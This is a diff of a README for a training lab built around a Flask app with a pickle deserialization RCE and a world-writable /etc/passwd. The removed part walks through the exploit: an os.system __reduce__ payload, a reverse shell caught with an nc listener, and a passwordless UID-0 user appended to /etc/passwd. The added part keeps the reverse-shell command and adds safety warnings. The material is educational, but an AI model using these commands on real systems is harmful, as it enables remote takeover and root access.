@@ -1,147 +1,45 @@
-# Pickle Deserialization – Vuln Lab
+# Pickle Deserialization / Privilege Escalation Lab
 
-This lab simulates a poorly designed internal backup dashboard built with Python Software Foundation Python and Pallets Projects Flask.
+This lab simulates an internal backup dashboard that restores Python sessions with `pickle.loads()`. Importing an attacker-controlled backup executes code in the container. The image then includes an intentionally unsafe `/etc/passwd` configuration for a second privilege-escalation exercise.
 
-Developers implemented a feature that allows administrators to export and import user sessions for migration and backup purposes.
+> Run this lab only on localhost or an isolated training network. Never upload real backup files.
 
-Because the system is considered “internal-only”, security checks were skipped.
+## Run it
 
-As a result, the application contains an pickle deserialization vulnerability that allows attackers to achieve remote code execution (RCE).
-
-## Credentials
-
-| User  | Password          |
-|-------|-------------------|
-| admin | Adm1n@Backup2024! |
-| guest | guest             |
-
-## Run Instructions
-
-### Option A – Docker Compose (recommended)
+Requirements: Docker with Compose.
 
 ```bash
-sudo docker compose up --build
+docker compose up --build
 ```
 
-App available at: http://localhost:9000
+Open <http://localhost:9000> and sign in with:
 
-### Option B – Local
+```text
+admin / Adm1n@Backup2024!
+guest / guest
+```
+
+From another terminal, run the included PoC:
 
 ```bash
-cd backend
-pip install -r requirements.txt
-# start redis locally first
-redis-server &
-python app.py
+python3 -m pip install -r exploit/requirements.txt
+python3 exp.py --cmd 'id'
 ```
 
----
+For the reverse-shell demonstration, replace `IP:PORT` with an address reachable from the container and start a listener first:
 
-## Vulnerability
-
-The `/import` endpoint passes user-controlled bytes directly to `pickle.loads()` after base64 decoding.
-
-### Exploit PoC (Python)
-
-`exp.py` exploits an insecure pickle deserialization vulnerability in Pallets Projects Flask backend to achieve remote code execution (RCE).
-
-1) Create malicious pickle object
-
-```
-class Exploit:
-    def __reduce__(self):
-        return (os.system, (cmd,))
-
-
-__reduce__() tells pickle what to execute during loading
-
-returns (os.system, cmd)
+```bash
+python3 exp.py --rev IP:PORT
 ```
 
-so pickle.loads() → runs os.system(cmd)
+The container creates a `zwique` user and intentionally makes `/etc/passwd` writable. After obtaining the lab shell, inspect the permissions and use the provided `flags/user.txt` and `/root/root.txt` objectives.
 
-2) Serialize + encode
-```
-pickle.dumps(Exploit(cmd))
-base64.b64encode(...)
-```
+Stop the lab with:
 
-pickle → convert object into executable byte stream
-
-base64 → match server’s expected format
-
-👉 produces the payload file
-
-3) Login
-```
-requests.Session().post("/login")
+```bash
+docker compose down
 ```
 
-gets authenticated cookie
+## What to study
 
-/import requires login
-
-4) Upload payload
-```
-files={"session_file": ("evil.bak", payload)}
-
-```
-
-sends payload as file upload (multipart/form-data)
-
-server reads it using:
-
-```
-request.files["session_file"].read()
-```
-
-
-5) Server vulnerability triggers
-
-Server does:
-```
-pickle.loads(base64.b64decode(data))
-```
-
-Which becomes:
-```
-os.system(cmd)
-```
-
-👉 your command executes on the target
-
-```
-python exp.py --rev IP:PORT
-```
-IP -> local private LAN IP Address
-PORT -> listener of port
-
-Listener:
-
-```nc -lnvp 4444```
-At this point you have a shell as zwique
-
-# Privilege Escalation via `/etc/passwd`
-
-### Why this works
-/etc/passwd is world-writable (misconfigured permissions: chmod 666).
-The x in the password field of an entry tells the system to look up the
-password hash in /etc/shadow. If you remove the x, the system treats
-the password as empty — no password required to authenticate
-
-```
-ls -la /etc/passwd
-# -rw-rw-rw- 1 root root ... /etc/passwd
-```
-
-##  Inject a new passwordless root-level user
-
-```
-# Add a new user 'pwn' with UID 0 and no password
-echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
-
-su hacker
-# Press Enter when prompted for password
-
-whoami  # → root
-```
+Pickle is not a safe data interchange format. It can execute arbitrary code while being loaded, even when the file is base64-encoded. Real applications should use a data-only format such as JSON and validate its schema. The unsafe import and container misconfiguration are intentional here.
